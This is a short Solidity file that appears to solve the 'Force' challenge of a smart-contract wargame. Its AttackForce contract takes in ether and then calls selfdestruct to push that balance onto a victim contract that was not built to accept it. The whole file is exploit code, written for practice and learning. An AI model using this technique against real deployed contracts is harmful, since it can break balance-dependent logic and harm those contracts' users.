// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Task.sol";

contract AttackForce {
    Force victim;

    constructor(address _victim) {
        victim = Force(_victim);
    }

    receive() external payable {}

    function attack() public payable {
        selfdestruct(payable(address(victim)));
   }
}